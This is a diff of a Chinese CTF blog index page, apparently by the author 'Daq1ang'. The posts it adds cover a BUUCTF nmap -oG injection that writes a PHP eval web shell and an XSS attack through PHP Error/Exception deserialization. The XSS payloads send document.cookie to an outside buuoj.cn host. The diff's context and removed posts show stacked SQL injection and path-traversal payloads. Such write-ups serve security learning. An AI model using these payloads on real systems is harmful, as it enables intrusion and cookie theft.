@@ -147,6 +147,147 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/19/Namp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/19/Namp/" class="post-title-link" itemprop="url">Namp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-19 16:17:31 / Modified: 17:13:46" itemprop="dateCreated datePublished" datetime="2021-03-19T16:17:31+08:00">2021-03-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>输入ip：127.0.0.1</p>
+<p>看到这里返回了nmap扫描的结果</p>
+<p>127.0.0.1 | ls查看目录，发现|被转义，其他命令也不能用</p>
+<p>用之前  [BUUCTF 2018]Online Tool  用到过的oG命令实现代码写入，构造payload，来利用‘拼接，写入我们想要的shell文件</p>
+<pre><code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></pre>
+<p>php被过滤，</p>
+<p>（1）利用&lt;?=来代替&lt;?php进行绕过</p>
+<p>（2）利用phtml来代替shell.php的文件后缀</p>
+<pre><code>127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#39;</code></pre>
+<p>返回发现上传成功，可蚁剑登录，也可以hackbar进行post传参</p>
+<pre><code>cmd=readfile(&quot;/flag&quot;)</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/17/XSS%E4%B9%8B%E5%85%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/17/XSS%E4%B9%8B%E5%85%89/" class="post-title-link" itemprop="url">XSS之光</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-17 13:52:42 / Modified: 15:05:37" itemprop="dateCreated datePublished" datetime="2021-03-17T13:52:42+08:00">2021-03-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>御剑扫后台，发现git泄露</p>
+<p>Githack扫出index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>
+<p>反序列化漏洞，但是没有类，那么则需要一个内置类进行反序列化</p>
+<h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">大佬的话：</span><br><span class="line"></span><br><span class="line">Error</span><br><span class="line">适用于php7版本</span><br><span class="line"></span><br><span class="line">Error类就是php的一个内置类用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个to_String的方法。如果有个pop链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 echo 一个反序列化以后的类 的写法，前文说了当对象被当作一个字符串使用时候调用(如echo的时候)会触发__toString方法，这个也看开发人员吧，好的开发人员应该不会这么写，但也是一种挖洞的新思路（对我而言）。</span><br><span class="line"></span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45521281&#x2F;article&#x2F;details&#x2F;105812056</span><br></pre></td></tr></table></figure>
+<p>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; unserialize($_GET[&#39;daqiang&#39;]);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>利用Error类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new Error(&quot;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;得：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D    生成的 urlencode($b)</span><br></pre></td></tr></table></figure>
+<p>url输入?daqiang=urlencode($b)  会有弹窗：1</p>
+<h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p>原理和Error类一样，适用于php5和php7，更好用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; unserialize($_GET[&#39;yds&#39;]);</span><br><span class="line">echo $a;      </span><br><span class="line">?&gt;           </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new Exception(&quot;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;得：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br><span class="line">echo unserialize($c);</span><br></pre></td></tr></table></figure>
+<p>回到这个题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$daqiang &#x3D; new Exception(&quot;&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn&#x2F;?&#39;+document.cookie);&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;window.open 是 javaScript 打开新窗口的方法</span><br><span class="line"></span><br><span class="line">也可以用window.location.href&#x3D;&#39;url&#39;来实现恶意跳转</span><br><span class="line">&lt;?php</span><br><span class="line">$daqiang &#x3D; new Exception(&quot;&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;8ff615f3-da70-4d1a-959f-f29d817ecd90.node3.buuoj.cn&#39;+document.cookie&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或者用alert(document.cookie)直接弹出cookie，但此题不行，可能开了httponly（见附录）。</span><br><span class="line">&lt;?php</span><br><span class="line">$daiqng &#x3D; new Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/shrine1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -928,73 +1069,6 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/02/Node-js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Node.js学习笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-02-02 15:35:04" itemprop="dateCreated datePublished" datetime="2021-02-02T15:35:04+08:00">2021-02-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-03 10:31:39" itemprop="dateModified" datetime="2021-02-03T10:31:39+08:00">2021-02-03</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>今天自学node.js，先康康《菜鸟笔记》。从《菜鸟笔记》中学习，然后写一些感悟和自己的看法。<br>冲冲冲！</p>
-<h2 id="Node-js创建第一个应用"><a href="#Node-js创建第一个应用" class="headerlink" title="Node.js创建第一个应用"></a>Node.js创建第一个应用</h2><p><img src="images/nodejs1.0.png" alt="nodejs1.0"><br>说node.js可以完成后端代码的一条龙服务     </p>
-<h3 id="创建应用的具体步骤"><a href="#创建应用的具体步骤" class="headerlink" title="创建应用的具体步骤"></a>创建应用的具体步骤</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/nodejs/nodejs-http-server.html">https://www.runoob.com/nodejs/nodejs-http-server.html</a><br>具体操作：可行</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1056,140 +1130,6 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
 <h2 id="方法3-修改表名和列名"><a href="#方法3-修改表名和列名" class="headerlink" title="方法3.修改表名和列名"></a>方法3.修改表名和列名</h2><p>由上面知道flag在表“1919810931114514”中，查表words<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz9.jpg" alt="buu-sbz1.png"><br>根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id，我们可以利用数据库修改表名和列名的方法，将我们要查询的表名改成第二个，就可以查询出想要的内容了<br>操作如下：<br>alter table words rename to aaa;先把原来的words表名字改成其他<br>alter table 1919810931114514 rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>构造payload如下：</p>
 <pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);--+</code></pre>
 <p>然后我们用1’ or 1=1 –+直接就能得到  </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-Warmup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/31/buu-Warmup/" class="post-title-link" itemprop="url">buu-Warmup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-01-31 17:28:53" itemprop="dateCreated datePublished" datetime="2021-01-31T17:28:53+08:00">2021-01-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-17 14:15:25" itemprop="dateModified" datetime="2021-03-17T14:15:25+08:00">2021-03-17</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="根据题目得到代码如下，开始代码审计"><a href="#根据题目得到代码如下，开始代码审计" class="headerlink" title="根据题目得到代码如下，开始代码审计"></a>根据题目得到代码如下，开始代码审计</h2><pre><code>&lt;?php
-    highlight_file(__FILE__);
-class emmm
-&#123;
-    public static function checkFile(&amp;$page)
-    &#123;
-        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
-        //得到另外一个文件hint.php，包含得到flag的文件名
-
-        //isset()判断变量是否声明，is_string()判断变量是否是字符串
-        if (! isset($page) || !is_string($page)) &#123;
-            echo &quot;you can&#39;t see it&quot;;
-            return false;
-        &#125;
-
-        //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
-        if (in_array($page, $whitelist)) &#123;            
-            return true;
-        &#125;
-
-        //过滤问号的函数(如果$page的值有？则从?之前提取字符串)
-        $_page = mb_substr(
-            $page,
-            0,
-            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
-        );
-
-        //第二次检测传进来的值是否匹配白名单列表$whitelist
-        if (in_array($_page, $whitelist)) &#123;
-            return true;
-        &#125;
-
-        //对$page进行url解码
-        $_page = urldecode($page);
-
-         //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)
-        $_page = mb_substr(
-            $_page,
-            0,
-            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-        );
-
-        //第三次检测传进来的值是否匹配白名单列表$whitelist
-        if (in_array($_page, $whitelist)) &#123;
-            return true;
-        &#125;
-
-        //若以上都没通过，则返回false
-        echo &quot;you can&#39;t see it&quot;;
-        return false;
-    &#125;
-&#125;
-
-//---------------------------------------------------------------
-//这里就到了文件包含，需要传入的参数file不为空且是字符串，经过class emmm的检测，即emmm返回真，则包含file    
-if (! empty($_REQUEST[&#39;file&#39;])
-    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
-    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
-) &#123;
-    include $_REQUEST[&#39;file&#39;];
-    exit;
-&#125; else &#123;
-    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-&#125;  
-?&gt;</code></pre>
-<hr>
-<p>观察源码发现hint.php，打开发现<br>flag not here, and flag in ffffllllaaaagggg<br>如果满足相应的条件，include引入文件。只需使emmm::checkFile($_REQUEST[‘file’]返回值为true，利用../跳转目录读取flag即可。<br>payload为：file=source.php?/../ffffllllaaaagggg，经过mb_strpos为source.php?/../ffffllllaaaagggg?,  但是mb_strpos这个函数只返回首次出现的位置，所以还是会返回第一个？的位置，而mb_substr截取函数，从0开始截取一直到第一个？的位置，截取内容为source.php，恰好能与白名单中的进行匹配，可以return true;，所以通过第一次截取进行绕过<br>ffffllllaaaagggg文件和index.php不在同一个目录下，所以读取的是上级目录。构造payload <a target="_blank" rel="noopener" href="http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg%EF%BC%8C%E6%89%BE%E5%88%B0flag%EF%BC%88%E5%88%A9%E7%94%A8/%E4%BD%BFsource.php?%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9C%80%E5%90%8Einclude%E5%88%A9%E7%94%A8../%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%8F%96flag%E5%8D%B3%E5%8F%AF%EF%BC%89">http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg，找到flag（利用/使source.php?成为一个不存在的目录，最后include利用../跳转目录读取flag即可）</a>  </p>
-<ul>
-<li>注意：../ 有多少个不一定，因为不知道flag在第几层目录里，需要从没有开始一次加一个去尝试。</li>
-</ul>
 
       
     </div>
@@ -1279,11 +1219,11 @@ if (! empty($_REQUEST[&#39;file&#39;])
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
